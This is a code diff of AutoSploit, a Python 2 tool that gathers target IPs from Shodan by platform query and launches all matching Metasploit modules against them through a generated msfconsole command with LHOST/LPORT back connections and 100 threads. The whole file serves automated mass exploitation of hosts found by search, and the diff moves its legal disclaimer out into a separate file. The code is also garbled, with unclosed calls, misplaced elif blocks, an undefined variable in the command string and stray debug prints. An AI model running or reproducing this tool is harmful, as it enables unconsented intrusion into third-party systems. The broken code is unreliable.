@@ -1,12 +1,13 @@
 #!/usr/bin/env python2.7
-"""Autosploit Core."""
+"""Autosploit Core, beta development version"""
 
 import os, sys
 import time
 import pickle
 import shodan
 
-from retrying import retry
+# idk if you're going to need this since retrying is a decorator (see line 410)
+# from retrying import retry
 from blessings import Terminal
 from subprocess import PIPE, Popen
 
@@ -20,7 +21,13 @@ local_port    = ""
 local_host    = ""
 configured    = False
 toolbar_width = 60
-
+usage_and_legal_path = "{}/etc/general".format(os.getcwd())
+modules_path = "{}/etc/modules.txt".format(os.getcwd())
+autosploit_opts = {
+    1: "usage and legal", 2: "gather hosts", 3: "custom hosts",
+    4: "add single host", 5: "view gathered hosts", 6: "exploit gathered hosts",
+    7: "quit"
+}
 
 def logo():
     """Logo."""
@@ -36,48 +43,12 @@ def logo():
 
 def usage():
     """Usage & Legal."""
+    global usage_and_legal_path
     print("\033[H\033[J")  # Clear terminal
     logo()
-    print("""
-+-----------------------------------------------------------------------+
-|            AutoSploit General Usage and Information                   |
-+-----------------------------------------------------------------------+
-|As the name suggests AutoSploit attempts to automate the exploitation  |
-|of remote hosts. Targets are collected by employing the Shodan.io API. |
-|                                                                       |
-|The 'Gather Hosts' option will open a dialog from which you can        |
-|enter platform specific search queries such as 'Apache' or 'IIS'.      |
-|Upon doing so a list of candidates will be retrieved and saved to      |
-|hosts.txt in the current working directory.				|
-|As of version 1.4.9 an option to load a custom list of hosts has been  |
-|included.                                                              |
-|After this operation has been completed the 'Exploit' option will      |
-|go about the business of attempting to exploit these targets by        |
-|running a range of Metasploit modules against them.                    |
-|                                                                       |
-|Workspace, local host and local port for MSF facilitated               |
-|back connections are configured through the dialog that comes up       |
-|before the 'Exploit' module is started.                                |
-|                                                                       |
-+------------------+----------------------------------------------------+
-|     Option       |                   Summary                          |
-+------------------+----------------------------------------------------+
-|1. Usage/Legal    | Display this informational message & Disclaimer    |
-|2. Gather Hosts   | Query Shodan for a list of platform specific IPs.  |
-|3. Custom Hosts   | Load in a custom list of IPs/Rhosts                |
-|4. Single Host    | Add a single host to list and/or exploit directly  |
-|4. View Hosts     | Print gathered IPs/RHOSTS.                         |
-|5. Exploit        | Configure MSF and Start exploiting gathered targets|
-|6. Quit           | Exits AutoSploit.                                  |
-+------------------+----------------------------------------------------+
-|                         Legal Disclaimer                              |
-+-----------------------------------------------------------------------+
-|Usage of AutoSploit for attacking targets without prior mutual consent | 
-|is illegal. It is the end user's responsibility to obey all applicable | 
-|local, state, and federal laws. Developers assume no liability and are |
-|not responsible for any misuse or damage caused by this program.	|
-+-----------------------------------------------------------------------+
-""")
+    with open(usage_and_legal_path) as info:
+        print(info.read())
+
 
 
 def cmdline(command):
@@ -99,12 +70,13 @@ def cmdline(command):
 
 def exploit(query=None, single=None):
     """Exploit component"""
-	
+
     global workspace
     global local_port
     global local_host
+    global modules_path
     print("\033[H\033[J")  # Clear terminal
-	
+
     logo()
     
     sorted_modules = []
@@ -112,43 +84,43 @@ def exploit(query=None, single=None):
 
     if query == None:
         rhosts = single
-		
+
         print("\n[{}]Single target mode. All available modules will be run against provided RHOST.".format(t.green("+")))
         proceed = raw_input("[" + t.magenta("?") + "]Continue? [Y]es/[N]o: ").lower()
-		
+
         if proceed == 'y':
             print("\n\n\n[{}]Loading modules...".format(t.green("+")))
             # Progress bar
             sys.stdout.write("[%s]" % (" " * toolbar_width))
             sys.stdout.flush()
             sys.stdout.write("\b" * (toolbar_width + 1))
-			
-            with open("modules.txt", "rb") as infile:
+
+            with open(modules_path, "rb") as infile:
                 for i in xrange(toolbar_width):
-		    time.sleep(0.1)
+                    time.sleep(0.1)
                     for lines in infile:
                         all_modules.append(lines)
-		
+
             print("\n\n\n[{}]Done. Launching exploits.".format(t.green("+")))
             template = "sudo msfconsole -x 'workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s'" % (workspace, local_host, local_port, rhosts, exploit)
             cmdline(template)
-		
+
         elif proceed == 'n':
             print("[{}]Aborted. Returning to Main Menu".format(t.red("!")))
-			
+
         else:
             print("[{}]Unhandled Option. Defaulting to Main Menu".format(t.red("!")))
-		
+
     else:
         print("[{}]Sorting modules relevant to the specified platform.".format(t.green("+")))
         print("[{}]This may take a while...\n\n\n".format(t.green("+")))
 
         # Progress bar
 	sys.stdout.write("[%s]" % (" " * toolbar_width))
-	sys.stdout.flush()
+    sys.stdout.flush()
 	sys.stdout.write("\b" * (toolbar_width + 1))
 
-        with open("modules.txt", "rb") as infile:
+        with open(modules_path, "rb") as infile:
 	    for i in xrange(toolbar_width):
                 time.sleep(0.1)
                 for lines in infile:
@@ -185,7 +157,7 @@ def exploit(query=None, single=None):
                         cmdline(template)
         else:
 	    print("[{}]Unhandled Option. Defaulting to Main Menu".format(t.red("!")))
-			
+
 
 def settings(single=None):
     """Function to define Metasploit settings."""
@@ -237,14 +209,14 @@ def settings(single=None):
         # When we return to the main menu loop we will use it to check to see if we
         # can skip the config stage. When the exploit component is run a second time
         configured = True
-		
+
         if single is not None:
             exploit(None, single)
             # TEST print
             print "De waarde van 'single' is" +repr(single)
             print 'we moete nu de exploit module in met de juiste waarde'
             # TEST print
-		
+
         if not os.path.isfile("hosts.txt"):
 	    print("[{}]Warning. AutoSploit failed to detect host file.".format(t.red("!")))
             print("In order for the exploit module to work, a host file needs to be present.")
@@ -265,12 +237,13 @@ def targets(clobber=True):
     print("[{}]Please provide your platform specific search query.".format(t.green("+")))
     print("[{}]I.E. 'IIS' will return a list of IPs belonging to IIS servers.".format(t.green("+")))
 
+    # /TODO:
     while True:
         query = raw_input("\n<" + t.cyan("PLATFORM") + ">$ ")
 
         if query == "":
 	    print("[{}]Query cannot be null.".format(t.red("!")))
-		
+
         break
 
     
@@ -288,6 +261,7 @@ def targets(clobber=True):
     sys.stdout.flush()
     sys.stdout.write("\b" * (toolbar_width + 1))
 
+    # TODO:/
     if clobber:
 	with open('hosts.txt', 'wb') as log:
             for i in xrange(toolbar_width):
@@ -305,6 +279,7 @@ def targets(clobber=True):
         print("\n\n\n[{}]Done.".format(t.green("+")))
         print("[{}]Host list saved to {}".format(t.green("+"), hostpath))
 
+    # TODO:/
     else:
 	with open("hosts.txt", "ab") as log:
 	    for i in xrange(toolbar_width):
@@ -324,13 +299,16 @@ def targets(clobber=True):
 
 
 
-def import_custom(clobber=True):	
-    """Function to import custom host list."""
+# TODO:/
+def import_custom(clobber=True):
+    """
+    Function to import custom host list.
+    """
     print("\033[H\033[J")  # Clear terminal
     logo()
-	
+
     custom_list = []
-	
+
     print("[{}]Please provide a path to your custom host list.".format(t.green("+")))
     file_path = raw_input("\n[" + t.magenta("?") + "]Path to list: "
  
@@ -342,7 +320,7 @@ def import_custom(clobber=True):
     except IOError as e: 
 	print("\n[{}]Critical. An IO error was raised.".format(t.red("!")))
         print("Please make sure to enter a valid path.")
-	
+
     if clobber:
         print("[{}]Writing data to 'hosts.txt'...".format(t.green("+")))
             with open('hosts.txt', 'wb') as outfile:
@@ -351,10 +329,10 @@ def import_custom(clobber=True):
                     outfile.write("\n")
 
         hostpath = os.path.abspath("hosts.txt")
-		
+
         print("\n\n\n[{}]Done.".format(t.green("+")))
         print("[{}]Host list saved to {}".format(t.green("+"), hostpath))
-		
+
     else:
         print("[{}]Appending data to 'hosts.txt'...".format(t.green("+")))
 
@@ -364,19 +342,20 @@ def import_custom(clobber=True):
                 outfile.write("\n")
 
         hostpath = os.path.abspath("hosts.txt")
-		
+
         print("\n\n\n[{}]Done.".format(t.green("+")))
         print("[{}]Host list saved to {}".format(t.green("+"), hostpath))
 
 
-def single_target()
+def single_target():
+    # TODO:/
     """
     Add single target to host list or pass it to the exploit function directly
     to attempt to exploit it.
     """
     print("\033[H\033[J")  # Clear terminal
     logo()
-	
+
     print("[{}]Please provide a single IPv4.".format(t.green("+")))
     IP = raw_input("[" + t.magenta("?") + "]IPv4 Address: ")
 
@@ -387,9 +366,9 @@ def single_target()
     quartet3 = int(IP[0:IP.index('.')])				
     IP = IP[IP.index('.')+1:]
     quartet4 = int(IP)								
-					
+
     IP = str(quartet1) + "." + str(quartet2) + "." + str(quartet3) + "." + str(quartet4)
-										
+
     if quartet1 < 0 or quartet1 > 255:
         print("[{}]Critical. Invalid IPv4 address.".format(t.red("!")))
     elif quartet2 < 0 or quartet2 > 255:
@@ -403,33 +382,35 @@ def single_target()
     else:
         print("\n[{}]Host set to {}".format(t.green("+"), repr(hostpath)))
         time.sleep(1)
-			
+
         print("\n\n[{}]Append the IP to the host file or pass to exploit module directly?.".format(t.green("+")))
         choice = raw_input("\n[" + t.magenta("?") + "]Append or Pass for immediate exploitation? [A/P]: ").lower()
-		
+
         if choice == 'a':
             with open( "hosts.txt", "ab") as outfile:				
                 outfile.write(IP)
-		
+
         hostpath = os.path.abspath("hosts.txt")	
         print("[{}]Host added to {}".format(t.green("+"), hostpath))		
-		
+
         elif choice == 'p':
             if configured:
                 exploit(None, IP)
             else:
                 settings(IP)
-				
+
         else:
             print("\n[{}]Unhandled Option.".format(t.red("!")))
-				
+
 
 def main():
     """Main menu."""
     global query
     global configured
     global api
+    global autosploit_opts
 
+    # TODO:/
     @retry(stop_max_attempt_number=3)
     def try_shodan():
         try:
@@ -449,12 +430,8 @@ def main():
                  settings()
 
             print("\n[{}]Welcome to AutoSploit. Please select an action.".format(t.green("+")))
-            print("""
-
-1. Usage/Legal 	       4. Add Single host       7. Quit   			
-2. Gather Hosts        5. View Hosts						
-3. Custom Hosts        6. Exploit                            
-""")
+            for i in autosploit_opts.keys():
+                print("{}. {}".format(i, autosploit_opts[i].title()))
 
         action = raw_input("\n<" + t.cyan("AUTOSPLOIT") + ">$ ")
 
@@ -473,20 +450,20 @@ def main():
                     targets(True)
                 else:
                      print("\n[{}]Unhandled Option.".format(t.red("!")))
-			
+
         elif action == '3':
             if not os.path.isfile("hosts.txt"):
                 import_custom(True)
             else:
                 append = raw_input("\n[" + t.magenta("?") + "]Append hosts to file or overwrite? [A/O]: ").lower()
-					
+
                 if append == 'a':
                     import_custom(False)
                 elif append == 'o':
                     import_custom(True)
                 else:
                     print("\n[{}]Unhandled Option.".format(t.red("!")))
-			
+
         elif action == '4':
             single_target()
 
